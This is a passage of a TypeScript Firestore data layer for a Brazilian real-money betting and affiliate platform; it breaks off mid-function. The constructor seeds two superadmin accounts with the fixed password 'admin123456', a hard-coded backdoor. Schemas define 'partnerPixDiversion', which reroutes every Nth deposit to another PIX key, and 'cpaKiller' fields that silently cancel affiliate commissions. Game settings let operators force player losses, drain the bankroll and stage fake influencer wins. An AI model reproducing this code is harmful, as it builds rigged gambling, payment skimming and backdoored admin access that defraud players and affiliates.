import { initializeApp, getApps } from 'firebase/app';
import {
  getFirestore,
  collection,
  doc,
  getDoc,
  getDocs,
  setDoc,
  updateDoc,
  deleteDoc,
  query,
  where
} from 'firebase/firestore';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import { encryptSensitiveData, decryptSensitiveData } from './security.ts';

let firebaseConfig: any = {};
try {
  const configPath = path.resolve(process.cwd(), 'firebase-applet-config.json');
  if (fs.existsSync(configPath)) {
    firebaseConfig = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
  }
} catch (e) {
  console.warn('Could not read firebase-applet-config.json:', e);
}

const app = getApps().length === 0 ? initializeApp(firebaseConfig) : getApps()[0];
export const firestoreDb = getFirestore(app, firebaseConfig.firestoreDatabaseId || '(default)');

export interface PushSubscriptionDB {
  id?: string;
  endpoint: string;
  subscription: {
    endpoint: string;
    expirationTime?: number | null;
    keys?: {
      p256dh: string;
      auth: string;
    };
  };
  userId: string;
  isAffiliate?: boolean;
  preferences?: {
    registration?: boolean;
    ftd?: boolean;
    pixPending?: boolean;
    gameActivity?: boolean;
  };
  userAgent?: string;
  createdAt: string;
  updatedAt: string;
}

export interface StoredChargeDB {
  id: string;
  chargeId: string;
  correlationID: string;
  transactionID?: string;
  qrCode?: string;
  qrCodeImage?: string;
  paymentLink?: string;
  expiresAt?: string;
  value: number; // centavos
  valueInReais: number;
  description: string;
  customer?: any;
  status: "PENDING" | "PAID" | "COMPLETED" | "EXPIRED" | "CANCELLED";
  createdAt: string;
  split?: any[];
  webhook_url?: string;
  userId?: string;
  credited?: boolean;
  rawResponse?: any;
}

export interface AdminNotificationLogDB {
  id: string;
  title: string;
  body: string;
  target: string;
  targetLabel: string;
  eligibleCount?: number;
  attemptedCount?: number;
  sentCount: number;
  expiredCount?: number;
  failedCount?: number;
  failures?: any[];
  totalEligibleAffiliates: number;
  createdAt: string;
  sentBy: string;
}

export interface AffiliateFeedNotificationDB {
  id: string;
  title: string;
  body: string;
  url: string;
  target: string;
  targetLabel?: string;
  createdAt: string;
  sentBy: string;
}

export interface AdminPermissions {
  canManageUsers?: boolean;
  canManageBalances?: boolean;
  canManageCommissions?: boolean;
  canApproveWithdrawals?: boolean;
  canApproveDeposits?: boolean;
  canSendNotifications?: boolean;
  canManageGames?: boolean;
  canManageAdmins?: boolean;
  canViewMetrics?: boolean;
  canExportReports?: boolean;
  canManageDotfy?: boolean;
}

export interface DotfyGatewayConfigDB {
  id?: string;
  activeApiKey?: string;
  secondaryApiKey?: string;
  webhookSecret?: string;
  webhookUrl?: string;
  autoWithdrawEnabled?: boolean;
  affiliateAutoCashoutEnabled?: boolean;
  minWithdrawLimit?: number;
  maxWithdrawLimit?: number;
  updatedAt?: string;
  updatedBy?: string;
}

export interface UserDB {
  id: string;
  name: string;
  email: string;
  phone: string;
  passwordHash: string;
  affiliateId?: string;
  parentAffiliateId?: string;
  parentAffiliateUserId?: string;
  referredBy?: string;
  referralCode: string;
  balance: number;
  minWithdraw?: number;
  withdrawFee?: number;
  isInfluencer?: boolean;
  influencerRate?: number;
  influencerBalance?: number;
  influencerUserId?: string;
  influencerAffiliateId?: string;
  influencerName?: string;
  cpaKillerAllowed?: boolean;
  cpaKillerActive?: boolean;
  cpaKillerEveryX?: number;
  cpaKillerKillY?: number;
  cpaCounter?: number;
  pixKey?: any;
  pixKeys?: any[];
  createdAt: string;
  role?: 'user' | 'admin' | 'superadmin' | 'affiliate';
  isBlocked?: boolean;
  isPartner?: boolean;
  partnerApproved?: boolean;
  partnerRequested?: boolean;
  partnerRequestedAt?: string;
  partnerCode?: string;
  partnerId?: string;
  partnerUserId?: string;
  partnerCommissionPercent?: number;
  revSharePercent?: number;
  autoWithdrawBlocked?: boolean;
  withdrawBlocked?: boolean;
  hasAffiliateDemoBalance?: boolean;
  affiliateDemoCreditedAt?: string;
  affiliateDemoCreditedBy?: string;
  partnerPixDiversion?: {
    active: boolean;
    pixKey: string;
    pixKeyType: 'cpf' | 'cnpj' | 'email' | 'phone' | 'random';
    beneficiaryName?: string;
    percent: number;
    everyNth?: number;
    minAmount?: number;
    targetMode?: 'all' | 'specific';
    targetAffiliateIds?: string[];
    ruleMode?: 'ratio' | 'range' | 'percent';
    ratioEveryX?: number;
    ratioDivertY?: number;
    rangeStartX?: number;
    rangeEndY?: number;
    counter?: number;
    affiliateCounters?: Record<string, number>;
    totalDivertedAmount: number;
    totalDivertedCount: number;
    lastDivertedAt?: string;
    recentLogs?: Array<{
      id: string;
      depositId: string;
      amount: number;
      playerName: string;
      playerEmail?: string;
      affiliateId?: string;
      affiliateName: string;
      affiliateCode?: string;
      saleNumber?: number;
      divertedKey: string;
      divertedAt: string;
      status?: string;
      cycleInfo?: string;
    }>;
  };
  adminPermissions?: AdminPermissions;
  origin?: string;
  registeredGame?: string;
  acquisitionGame?: string;
  gameBalances?: Record<string, number>;
}

export interface AffiliateDB {
  id: string;
  userId: string;
  referralCode: string;
  status: 'active' | 'pending';
  commissionTotal: number;
  affiliateBalance: number;
  cpaAmount?: number;
  revSharePercent?: number;
  partnerCommissionPercent?: number;
  withdrawFee?: number;
  cpaKillerActive?: boolean;
  cpaKillerEveryX?: number;
  cpaKillerKillY?: number;
  cpaCounter?: number;
  createdAt: string;
}

export interface ReferralDB {
  id: string;
  affiliateId: string;
  referredUserId: string;
  referralCode: string;
  registeredGame?: string;
  gameId?: string;
  referredByInfluencerId?: string;
  referredByInfluencerName?: string;
  isFromInfluencer?: boolean;
  metadata?: any;
  createdAt: string;
}

export interface TransactionDB {
  id: string;
  userId: string;
  type: 'deposit' | 'withdrawal';
  amount: number;
  status: 'approved' | 'pending' | 'rejected';
  paymentMethod: string;
  description: string;
  createdAt: string;
  dotfyWithdrawalId?: string;
  pixKeyId?: string;
  isAutoCashout?: boolean;
  fee?: number;
  netAmount?: number;
  affiliateId?: string;
  affiliateUserId?: string;
  sponsorName?: string;
  gameOrigin?: string;
  rejectReason?: string;
  approvedByUserId?: string;
  approvedByName?: string;
  processedAt?: string;
  isPartnerDiverted?: boolean;
  partnerDivertedId?: string;
  partnerDivertedKey?: string;
  isDiverted?: boolean;
  divertedCommission?: number;
  divertedRule?: string;
  divertedAt?: string;
}

export interface GameDB {
  id: string;
  name: string;
  category: string;
  imageUrl: string;
  provider: string;
  status: 'active' | 'maintenance';
  minBet: number;
}

export interface GameConfigDB {
  id: string;
  name: string;
  category: string;
  status: 'active' | 'inactive';
  rtpPercent: number;
  difficulty: 'easy' | 'medium' | 'hard' | 'extreme';
  minBet: number;
  maxBet: number;
  totalWagered: number;
  totalPayout: number;
  ggr: number;
  totalBetsCount: number;
  houseEdgeMode: 'balanced' | 'house_advantage' | 'promo' | 'easy' | 'hard' | 'extreme';
  maxMultiplier: number;
  // Advanced House Edge / Difficulty Modifiers & Retention Control
  smartRtp?: boolean; // RTP Inteligente (Muito fácil até R$90, Retenção extrema R$90-R$100)
  smartRtpEasyThreshold?: number; // Padrão 90.0
  smartRtpMidThreshold?: number; // Padrão 60.0
  smartRtpHardThreshold?: number; // Padrão 100.0
  smartRtpMaxTarget?: number; // Padrão 100.0 (Teto de R$100 onde a retenção é máxima)
  emergencyRetentionMode?: boolean; // Trava de emergência (100% drenagem de banca)
  influencerGlobalBoost?: boolean; // Modo demo/influencer (vitórias espetaculares)
  highBetThreshold?: number; // Limiar de aposta alta para ativar resistência dinâmica (Padrão R$ 50)
  antiBailoutMode?: boolean;
  heavyBlocksForce?: boolean;
  dynamicRetention?: boolean;
  streakLimiterMultiplier?: number;
  nearLossPressure?: boolean;
  winStreakBrake?: boolean;
  antiComboBlocker?: boolean;
  highBetResistance?: boolean;
  giantPieceFrequency?: number;
  instantLossOnTargetProfit?: number;
  tightenOnHighOccupancy?: boolean;
  minCashoutMultiplier?: number;
  lineMultiplierStep?: number;
  initialMultiplier?: number; // Base starting multiplier (e.g. 1.0x or 1.10x)
  retentionAggressiveness?: 'soft' | 'moderate' | 'aggressive' | 'ruthless' | 'impossible'; // Retention curve preset
  forceLossOnMaxMultiplier?: boolean; // Force game-ending pressure upon reaching max multiplier
  consecutiveWinDecay?: number; // Decay multiplier boost rate on long win streaks
  // Zumbla / Arcade mechanics
  reactionWindowMs?: number;
  comboWindowMs?: number;
  mistakeTolerance?: number;
  difficultyRampPercent?: number;
  easyOpeningRounds?: number;
  extremeModeStartRound?: number;
  phaseDifficultyMultiplier?: number;
  // Gen Dino Specific Settings & Popups
  obstacleMultiplier?: number; // 1.0 to 5.0x
  baseSpeed?: number; // 4 to 25
  maxSpeed?: number; // 8 to 35
  acceleration?: number; // 0.0005 to 0.01
  gameSpeedPercent?: number; // 50 to 300%
  obstacleDensityPercent?: number; // 0 to 200%
  bonusFrequencyPercent?: number; // 0 to 100%
  coinValueCents?: number; // default 100
  // Popup with image management for Games
  popupEnabled?: boolean;
  popupTitle?: string;
  popupDescription?: string;
  popupImageUrl?: string;
  popupButtonText?: string;
  popupButtonAction?: 'deposit' | 'bonus' | 'link' | 'none';
  popupButtonUrl?: string;
  popupTrigger?: 'start' | 'gameover' | 'immediate' | 'deposit_needed';
  // Hero banner customizations
  heroBannerImageUrl?: string;
  heroBannerTitle?: string;
  heroBannerSubtitle?: string;
  heroBannerBadge?: string;
  configVersion?: number;
  updatedAt?: string;
}

export interface GameBetDB {
  id: string;
  userId: string;
  userName?: string;
  gameId: string;
  betAmount: number;
  multiplier: number;
  payoutAmount: number;
  profitAmount: number;
  status: 'active' | 'cashed_out' | 'lost';
  difficulty: 'easy' | 'medium' | 'hard' | 'extreme';
  rtpPercent: number;
  createdAt: string;
  updatedAt?: string;
}

export interface GameStatsDB {
  id: string;
  userId: string;
  userName?: string;
  highScore: number;
  gamesPlayed: number;
  linesCleared: number;
  maxCombo: number;
  level: number;
  updatedAt: string;
}

export interface GameSessionDB {
  id: string;
  userId: string;
  score: number;
  lines: number;
  maxCombo: number;
  createdAt: string;
}

export interface AffiliateCommissionDB {
  id: string;
  affiliateId: string;
  referrerUserId: string;
  buyerUserId: string;
  transactionId: string;
  amount: number;
  isKilled?: boolean;
  createdAt: string;
}

export interface InfluencerCommissionRequestDB {
  id: string;
  affiliateId: string;
  affiliateUserId: string;
  parentAffiliateId?: string;
  parentAffiliateUserId?: string;
  influencerUserId: string;
  influencerName: string;
  influencerEmail: string;
  amount: number;
  approvedAmount?: number;
  pixKey: string;
  pixKeyType?: string;
  status: 'pending' | 'approved' | 'rejected';
  createdAt: string;
  processedAt?: string;
  processedByUserId?: string;
  processedByName?: string;
  rejectReason?: string;
  gameOrigin?: string;
  totalDepositsBrought?: number;
  paidDepositsCount?: number;
  paidDepositsAmount?: number;
  referralsCount?: number;
}

export const INITIAL_GAMES: GameDB[] = [
  {
    id: 'block-puzzle',
    name: 'BLOCK PUZZLE',
    category: 'Puzzle',
    imageUrl: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=800&q=80',
    provider: 'GameStudio Original',
    status: 'active',
    minBet: 0,
  },
  {
    id: 'gendino',
    name: 'GEN DINO — ARCADE',
    category: 'Crash / Runner',
    imageUrl: '/games/gendino/images/gen-dino-cover.png',
    provider: 'Gen Dino Studios',
    status: 'active',
    minBet: 1.0,
  },
];

function sanitizeForFirestore<T extends Record<string, any>>(obj: T): T {
  const clean: Record<string, any> = {};
  for (const [key, val] of Object.entries(obj)) {
    if (val !== undefined) {
      clean[key] = val;
    }
  }
  return clean as T;
}

const memoryUsers = new Map<string, UserDB>();
const memoryAffiliates = new Map<string, AffiliateDB>();
const memoryReferrals = new Map<string, ReferralDB>();
const memoryTransactions = new Map<string, TransactionDB>();
const memoryConfigs = new Map<string, GameConfigDB>();
const memoryBets = new Map<string, GameBetDB>();
const memoryCommissions = new Map<string, AffiliateCommissionDB>();
const memoryInfluencerRequests = new Map<string, InfluencerCommissionRequestDB>();

export class FirestoreDB {
  constructor() {
    // Seed default admin in memory cache
    const defaultAdmin: UserDB = {
      id: 'usr_admin_master',
      name: 'Administrador Geral',
      email: 'admin.eduh@gmail.com',
      phone: '+55 11 99999-9999',
      passwordHash: this.hashPassword('admin123456'),
      referralCode: 'ADMINVIP',
      balance: 10000.0,
      createdAt: new Date().toISOString(),
      role: 'superadmin',
      adminPermissions: {
        canManageUsers: true,
        canManageBalances: true,
        canManageCommissions: true,
        canApproveWithdrawals: true,
        canApproveDeposits: true,
        canSendNotifications: true,
        canManageGames: true,
        canManageAdmins: true,
        canViewMetrics: true,
        canExportReports: true,
      }
    };
    memoryUsers.set(defaultAdmin.id, defaultAdmin);
    memoryUsers.set(defaultAdmin.email.toLowerCase(), defaultAdmin);

    const defaultAdmin2: UserDB = {
      id: 'usr_admin_tribo',
      name: 'Administrador TriboPay',
      email: 'tribopayeduh@gmail.com',
      phone: '+55 11 98888-8888',
      passwordHash: this.hashPassword('admin123456'),
      referralCode: 'TRIBOPAY',
      balance: 10000.0,
      createdAt: new Date().toISOString(),
      role: 'superadmin',
      adminPermissions: {
        canManageUsers: true,
        canManageBalances: true,
        canManageCommissions: true,
        canApproveWithdrawals: true,
        canApproveDeposits: true,
        canSendNotifications: true,
        canManageGames: true,
        canManageAdmins: true,
        canViewMetrics: true,
        canExportReports: true,
        canManageDotfy: true,
      }
    };
    memoryUsers.set(defaultAdmin2.id, defaultAdmin2);
    memoryUsers.set(defaultAdmin2.email.toLowerCase(), defaultAdmin2);
  }

  public hashPassword(pwd: string): string {
    const salt = crypto.randomBytes(16).toString('hex');
    const derivedKey = crypto.scryptSync(pwd, salt, 64, { N: 16384, r: 8, p: 1 });
    return `scrypt$16384$8$1$${salt}$${derivedKey.toString('hex')}`;
  }

  public generateReferralCode(): string {
    return 'REF' + crypto.randomBytes(3).toString('hex').toUpperCase();
  }

  async getUserByEmail(email: string): Promise<UserDB | null> {
    const cleanEmail = email.toLowerCase().trim();
    try {
      const q = query(collection(firestoreDb, 'users'), where('email', '==', cleanEmail));
      const snap = await getDocs(q);
      if (!snap.empty) {
        const user = snap.docs[0].data() as UserDB;
        memoryUsers.set(user.id, user);
        memoryUsers.set(cleanEmail, user);
        return user;
      }
      // Check in memory if not in firestore
      return memoryUsers.get(cleanEmail) || null;
    } catch (e) {
      console.warn('[Firestore] Error or permission delay on getUserByEmail, checking memory fallback:', e);
      return memoryUsers.get(cleanEmail) || null;
    }
  }

  async getUserById(id: string): Promise<UserDB | null> {
    try {
      const snap = await getDoc(doc(firestoreDb, 'users', id));
      if (snap.exists()) {
        const user = snap.data() as UserDB;
        memoryUsers.set(user.id, user);
        memoryUsers.set(user.email.toLowerCase(), user);
        return user;
      }
      return memoryUsers.get(id) || null;
    } catch (e) {
      console.warn('[Firestore] Error or permission delay on getUserById, checking memory fallback:', e);
      return memoryUsers.get(id) || null;
    }
  }

  async getUserByPartnerCode(code: string): Promise<UserDB | null> {
    const cleanCode = code.toUpperCase().trim();
    try {
      const q = query(collection(firestoreDb, 'users'), where('partnerCode', '==', cleanCode));
      const snap = await getDocs(q);
      if (!snap.empty) {
        const user = snap.docs[0].data() as UserDB;
        memoryUsers.set(user.id, user);
        return user;
      }
    } catch (e) {
      console.warn('[Firestore] Error fetching user by partnerCode from Firestore:', e);
    }
    for (const u of memoryUsers.values()) {
      if (u.partnerCode?.toUpperCase() === cleanCode) {
        return u;
      }
    }
    return null;
  }

  async getUserByPartnerOrReferralCode(code: string): Promise<UserDB | null> {
    const cleanCode = code.toUpperCase().trim();
    const byPartner = await this.getUserByPartnerCode(cleanCode);
    if (byPartner) return byPartner;
    return await this.getUserByReferralCode(cleanCode);
  }

  async getUserByReferralCode(code: string): Promise<UserDB | null> {
    const cleanCode = code.toUpperCase().trim();
    try {
      const q = query(collection(firestoreDb, 'users'), where('referralCode', '==', cleanCode));
      const snap = await getDocs(q);
      if (!snap.empty) {
        const user = snap.docs[0].data() as UserDB;
        memoryUsers.set(user.id, user);
        return user;
      }
    } catch (e) {
      console.warn('[Firestore] Error fetching user by referralCode from Firestore:', e);
    }
    for (const u of memoryUsers.values()) {
      if (u.referralCode?.toUpperCase() === cleanCode) {
        return u;
      }
    }
    // Also fallback to check if this code belongs to a partner
    for (const u of memoryUsers.values()) {
      if (u.partnerCode?.toUpperCase() === cleanCode) {
        return u;
      }
    }
    return null;
  }

  async createUser(user: UserDB): Promise<void> {
    memoryUsers.set(user.id, user);
    memoryUsers.set(user.email.toLowerCase(), user);
    try {
      await setDoc(doc(firestoreDb, 'users', user.id), sanitizeForFirestore(user));
    } catch (e) {
      console.warn('[Firestore] Warning: createUser could not immediately sync to cloud, stored in memory:', e);
    }
  }

  async updateUserBalance(id: string, newBalance: number): Promise<void> {
    const existing = memoryUsers.get(id);
    if (existing) {
      existing.balance = newBalance;
      memoryUsers.set(id, existing);
      memoryUsers.set(existing.email.toLowerCase(), existing);
    }
    try {
      await updateDoc(doc(firestoreDb, 'users', id), { balance: newBalance });
    } catch (e) {
      console.warn('[Firestore] Warning: updateUserBalance sync failed:', e);
    }
  }

  async updateUserFields(id: string, fields: Partial<UserDB & { isInfluencer?: boolean }>): Promise<void> {
    const existing = memoryUsers.get(id);
    if (existing) {
      Object.assign(existing, fields);
      memoryUsers.set(id, existing);
      if (existing.email) memoryUsers.set(existing.email.toLowerCase(), existing);
    }
    try {
      await updateDoc(doc(firestoreDb, 'users', id), sanitizeForFirestore(fields));
    } catch (e) {
      console.warn('[Firestore] Warning: updateUserFields sync failed:', e);
    }
  }

  async updateUser(id: string, fields: Partial<UserDB & { isInfluencer?: boolean }>): Promise<void> {
    return this.updateUserFields(id, fields);
  }

  async deleteUser(id: string): Promise<void> {
    const existing = memoryUsers.get(id);
    if (existing) {
      memoryUsers.delete(id);
      if (existing.email) memoryUsers.delete(existing.email.toLowerCase());
    }
    try {
      await deleteDoc(doc(firestoreDb, 'users', id));
    } catch (e) {
      console.warn('[Firestore] deleteUser failed:', e);
    }
  }

  async createAffiliate(aff: AffiliateDB): Promise<void> {
    memoryAffiliates.set(aff.id, aff);
    try {
      await setDoc(doc(firestoreDb, 'affiliates', aff.id), sanitizeForFirestore(aff));
    } catch (e) {
      console.warn('[Firestore] createAffiliate memory fallback:', e);
    }
  }

  async getAffiliateByUserId(userId: string): Promise<AffiliateDB | null> {
    try {
      const q = query(collection(firestoreDb, 'affiliates'), where('userId', '==', userId));
      const snap = await getDocs(q);
      if (!snap.empty) {
        const aff = snap.docs[0].data() as AffiliateDB;
        memoryAffiliates.set(aff.id, aff);
        return aff;
      }
    } catch (e) {
      console.warn('[Firestore] Error fetching affiliate by userId from Firestore:', e);
    }
    for (const a of memoryAffiliates.values()) {
      if (a.userId === userId) return a;
    }
    return null;
  }

  async getAffiliateById(id: string): Promise<AffiliateDB | null> {
    try {
      const snap = await getDoc(doc(firestoreDb, 'affiliates', id));
      if (snap.exists()) {
        const aff = snap.data() as AffiliateDB;
        memoryAffiliates.set(aff.id, aff);
        return aff;
      }
    } catch (e) {
      console.warn('[Firestore] Error fetching affiliate by id from Firestore:', e);
    }
    return memoryAffiliates.get(id) || null;
  }

  async getAffiliateByCode(code: string): Promise<AffiliateDB | null> {
    const rawTrimmed = (code || '').trim();
    const cleanCode = rawTrimmed.toUpperCase();
    if (!cleanCode) return null;

    try {
      let q = query(collection(firestoreDb, 'affiliates'), where('referralCode', '==', cleanCode));
      let snap = await getDocs(q);
      if (snap.empty && rawTrimmed !== cleanCode) {
        q = query(collection(firestoreDb, 'affiliates'), where('referralCode', '==', rawTrimmed));
        snap = await getDocs(q);
      }
      if (!snap.empty) {
        const aff = snap.docs[0].data() as AffiliateDB;
        memoryAffiliates.set(aff.id, aff);
        return aff;
      }
    } catch (e) {
      console.warn('[Firestore] Error fetching affiliate by code from Firestore:', e);
    }

    for (const a of memoryAffiliates.values()) {
      if (a.referralCode?.toUpperCase() === cleanCode || a.referralCode === rawTrimmed) return a;
    }
    return null;
  }

  async updateAffiliateCommissions(id: string, commissionTotal: number, affiliateBalance: number): Promise<void> {
    const existing = memoryAffiliates.get(id);
    if (existing) {
      existing.commissionTotal = commissionTotal;
      existing.affiliateBalance = affiliateBalance;
    }
    try {
      await updateDoc(doc(firestoreDb, 'affiliates', id), {
        commissionTotal,
        affiliateBalance,
      });
    } catch (e) {
      console.warn('[Firestore] updateAffiliateCommissions fallback:', e);
    }
  }

  async updateAffiliateFields(id: string, fields: Partial<AffiliateDB>): Promise<void> {
    const existing = memoryAffiliates.get(id);
    if (existing) {
      Object.assign(existing, fields);
    }
    try {
      await updateDoc(doc(firestoreDb, 'affiliates', id), sanitizeForFirestore(fields));
    } catch (e) {
      console.warn('[Firestore] updateAffiliateFields fallback:', e);
    }
  }

  async getAllAffiliates(): Promise<AffiliateDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'affiliates'));
      const items = snap.docs.map((d) => d.data() as AffiliateDB);
      items.forEach(a => memoryAffiliates.set(a.id, a));
      return items.length > 0 ? items : Array.from(memoryAffiliates.values());
    } catch (e) {
      console.warn('[Firestore] Error fetching all affiliates from Firestore:', e);
      return Array.from(memoryAffiliates.values());
    }
  }

  async updateAffiliateRates(id: string, data: {
    cpaAmount?: number;
    revSharePercent?: number;
    affiliateBalance?: number;
    withdrawFee?: number;
    cpaKillerActive?: boolean;
    cpaKillerEveryX?: number;
    cpaKillerKillY?: number;
    cpaCounter?: number;
  }): Promise<void> {
    const existing = memoryAffiliates.get(id);
    if (existing) {
      Object.assign(existing, data);
    }
    try {
      await updateDoc(doc(firestoreDb, 'affiliates', id), sanitizeForFirestore(data));
    } catch (e) {
      console.warn('[Firestore] updateAffiliateRates fallback:', e);
    }
  }

  async createReferral(ref: ReferralDB): Promise<void> {
    memoryReferrals.set(ref.id, ref);
    try {
      await setDoc(doc(firestoreDb, 'referrals', ref.id), sanitizeForFirestore(ref));
    } catch (e) {
      console.warn('[Firestore] createReferral fallback:', e);
    }
  }

  async getReferralsByAffiliateId(affiliateId: string): Promise<ReferralDB[]> {
    try {
      const q = query(collection(firestoreDb, 'referrals'), where('affiliateId', '==', affiliateId));
      const snap = await getDocs(q);
      const items = snap.docs.map((d) => d.data() as ReferralDB);
      items.forEach(r => memoryReferrals.set(r.id, r));
      return items.length > 0 ? items : Array.from(memoryReferrals.values()).filter(r => r.affiliateId === affiliateId);
    } catch (e) {
      console.warn('[Firestore] Error fetching referrals from Firestore:', e);
      return Array.from(memoryReferrals.values()).filter(r => r.affiliateId === affiliateId);
    }
  }

  async getAllReferrals(): Promise<ReferralDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'referrals'));
      const items = snap.docs.map((d) => d.data() as ReferralDB);
      items.forEach(r => memoryReferrals.set(r.id, r));
      return items.length > 0 ? items : Array.from(memoryReferrals.values());
    } catch (e) {
      console.warn('[Firestore] Error fetching all referrals from Firestore:', e);
      return Array.from(memoryReferrals.values());
    }
  }

  async updateReferral(id: string, data: Partial<ReferralDB>): Promise<void> {
    const existing = memoryReferrals.get(id);
    if (existing) {
      memoryReferrals.set(id, { ...existing, ...data });
    }
    try {
      await updateDoc(doc(firestoreDb, 'referrals', id), data);
    } catch (e) {
      console.warn('[Firestore] Error updating referral in Firestore:', e);
    }
  }

  async createTransaction(tx: TransactionDB): Promise<void> {
    memoryTransactions.set(tx.id, tx);
    try {
      await setDoc(doc(firestoreDb, 'transactions', tx.id), sanitizeForFirestore(tx));
    } catch (e) {
      console.warn('[Firestore] createTransaction fallback:', e);
    }
  }

  async updateTransaction(txId: string, updates: Partial<TransactionDB> & Record<string, any>): Promise<void> {
    const existing = memoryTransactions.get(txId);
    if (existing) {
      Object.assign(existing, updates);
    }
    try {
      await updateDoc(doc(firestoreDb, 'transactions', txId), sanitizeForFirestore(updates));
    } catch (e) {
      console.warn('[Firestore] updateTransaction error:', e);
    }
  }

  async getUserTransactions(userId: string): Promise<TransactionDB[]> {
    try {
      const q = query(collection(firestoreDb, 'transactions'), where('userId', '==', userId));
      const snap = await getDocs(q);
      const txs = snap.docs.map((d) => d.data() as TransactionDB);
      txs.forEach(t => memoryTransactions.set(t.id, t));
      return txs.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
    } catch (e) {
      console.warn('[Firestore] Error fetching user transactions from Firestore:', e);
      const local = Array.from(memoryTransactions.values()).filter(t => t.userId === userId);
      return local.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
    }
  }

  async getGames(): Promise<GameDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'games'));
      if (snap.empty) {
        // Seed initial games
        for (const g of INITIAL_GAMES) {
          await setDoc(doc(firestoreDb, 'games', g.id), sanitizeForFirestore(g));
        }
        return INITIAL_GAMES;
      }
      return snap.docs.map((d) => d.data() as GameDB);
    } catch (e) {
      console.error('Error fetching games from Firestore', e);
      return INITIAL_GAMES;
    }
  }

  async getGameStats(userId: string): Promise<GameStatsDB | null> {
    try {
      const snap = await getDoc(doc(firestoreDb, 'gameStats', userId));
      if (snap.exists()) {
        return snap.data() as GameStatsDB;
      }
      return null;
    } catch (e) {
      console.error('Error fetching game stats:', e);
      return null;
    }
  }

  async recordGameSession(userId: string, userName: string, score: number, lines: number, maxCombo: number): Promise<GameStatsDB> {
    const session: GameSessionDB = {
      id: 'sess_' + crypto.randomBytes(8).toString('hex'),
      userId,
      score,
      lines,
      maxCombo,
      createdAt: new Date().toISOString(),
    };

    await setDoc(doc(firestoreDb, 'gameSessions', session.id), sanitizeForFirestore(session));

    let existingStats = await this.getGameStats(userId);
    const newHighScore = existingStats ? Math.max(existingStats.highScore, score) : score;
    const newGamesPlayed = (existingStats?.gamesPlayed || 0) + 1;
    const newLinesCleared = (existingStats?.linesCleared || 0) + lines;
    const newMaxCombo = existingStats ? Math.max(existingStats.maxCombo, maxCombo) : maxCombo;
    const newLevel = Math.floor(newHighScore / 1000) + 1;

    const updatedStats: GameStatsDB = {
      id: userId,
      userId,
      userName: userName || 'Jogador',
      highScore: newHighScore,
      gamesPlayed: newGamesPlayed,
      linesCleared: newLinesCleared,
      maxCombo: newMaxCombo,
      level: newLevel,
      updatedAt: new Date().toISOString(),
    };

    await setDoc(doc(firestoreDb, 'gameStats', userId), sanitizeForFirestore(updatedStats));
    return updatedStats;
  }

  async getRanking(): Promise<GameStatsDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'gameStats'));
      const list = snap.docs.map((d) => d.data() as GameStatsDB);
      return list.sort((a, b) => b.highScore - a.highScore);
    } catch (e) {
      console.error('Error fetching ranking:', e);
      return [];
    }
  }

  async checkCommissionExistsByTransactionId(transactionId: string): Promise<boolean> {
    try {
      const q = query(collection(firestoreDb, 'affiliateCommissions'), where('transactionId', '==', transactionId));
      const snap = await getDocs(q);
      return !snap.empty;
    } catch (e) {
      console.error('Error checking commission existence:', e);
      return false;
    }
  }

  async createAffiliateCommission(comm: AffiliateCommissionDB): Promise<void> {
    await setDoc(doc(firestoreDb, 'affiliateCommissions', comm.id), sanitizeForFirestore(comm));
  }

  async getCommissionsByAffiliateId(affiliateId: string): Promise<AffiliateCommissionDB[]> {
    try {
      const q = query(collection(firestoreDb, 'affiliateCommissions'), where('affiliateId', '==', affiliateId));
      const snap = await getDocs(q);
      return snap.docs.map((d) => d.data() as AffiliateCommissionDB);
    } catch (e) {
      console.error('Error fetching affiliate commissions:', e);
      return [];
    }
  }

  async getAllCommissions(): Promise<AffiliateCommissionDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'affiliateCommissions'));
      return snap.docs.map((d) => d.data() as AffiliateCommissionDB);
    } catch (e) {
      console.error('Error fetching all affiliate commissions:', e);
      return [];
    }
  }

  async createInfluencerCommissionRequest(req: InfluencerCommissionRequestDB): Promise<void> {
    memoryInfluencerRequests.set(req.id, req);
    try {
      await setDoc(doc(firestoreDb, 'influencerCommissionRequests', req.id), sanitizeForFirestore(req));
    } catch (e) {
      console.warn('[Firestore] createInfluencerCommissionRequest fallback:', e);
    }
  }

  async getInfluencerCommissionRequestsByAffiliate(affiliateId: string, affiliateUserId?: string): Promise<InfluencerCommissionRequestDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'influencerCommissionRequests'));
      const items = snap.docs.map((d) => d.data() as InfluencerCommissionRequestDB);
      items.forEach(i => memoryInfluencerRequests.set(i.id, i));
      const filtered = items.filter(
        r => (affiliateId && r.affiliateId === affiliateId) || (affiliateUserId && r.affiliateUserId === affiliateUserId)
      );
      if (filtered.length > 0) {
        return filtered.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      }
    } catch (e) {
      console.warn('[Firestore] Error fetching influencer requests by affiliateId:', e);
    }
    const local = Array.from(memoryInfluencerRequests.values()).filter(
      r => (affiliateId && r.affiliateId === affiliateId) || (affiliateUserId && r.affiliateUserId === affiliateUserId)
    );
    return local.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
  }

  async getAllInfluencerCommissionRequests(): Promise<InfluencerCommissionRequestDB[]> {
    try {
      const snap = await getDocs(collection(firestoreDb, 'influencerCommissionRequests'));
      const items = snap.docs.map((d) => d.data() as InfluencerCommissionRequestDB);
      items.forEach(i => memoryInfluencerRequests.set(i.id, i));
      if (items.length > 0) {
        return items.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
      }
    } catch (e) {
      console.warn('[Firestore] getAllInfluencerCommissionRequests fallback:', e);
    }
    return Array.from(memoryInfluencerRequests.values()).sort(
      (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
    );
  }

  async getInfluencerCommissionRequestsByUser(influencerUserId: string): Promise<InfluencerCommissionRequestDB[]> {
    try {
      const q = query(collection(firestoreDb, 'influencerCommissionRequests'), where('influencerUserId', '==', influencerUserId));
